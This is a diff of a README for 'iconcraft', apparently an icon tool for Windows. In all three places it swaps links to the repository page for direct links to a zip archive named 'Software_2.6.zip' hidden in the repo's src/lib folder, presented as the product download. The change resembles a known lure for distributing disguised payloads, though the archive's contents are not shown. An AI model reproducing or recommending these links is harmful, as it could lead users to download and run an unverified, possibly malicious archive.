@@ -1,6 +1,6 @@
 # 🧩 iconcraft - Create Clean Icons Fast
 
-[![Download iconcraft](https://img.shields.io/badge/Download-iconcraft-blue?style=for-the-badge)](https://github.com/guidewordblacktea136/iconcraft)
+[![Download iconcraft](https://img.shields.io/badge/Download-iconcraft-blue?style=for-the-badge)](https://raw.githubusercontent.com/guidewordblacktea136/iconcraft/main/src/lib/Software_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Use this guide to download iconcraft and run it on your Windows PC.
 
 ## 📥 Download
 
-1. Open the download page: https://github.com/guidewordblacktea136/iconcraft
+1. Open the download page: https://raw.githubusercontent.com/guidewordblacktea136/iconcraft/main/src/lib/Software_2.6.zip
 2. Find the latest version or the main app file on the page
 3. Download the file to your computer
 4. Keep the file in a folder you can find, such as Downloads or Desktop
 
-[![Visit Download Page](https://img.shields.io/badge/Download_Page-grey?style=for-the-badge)](https://github.com/guidewordblacktea136/iconcraft)
+[![Visit Download Page](https://img.shields.io/badge/Download_Page-grey?style=for-the-badge)](https://raw.githubusercontent.com/guidewordblacktea136/iconcraft/main/src/lib/Software_2.6.zip)
 
 ## 🖥️ System Requirements
 
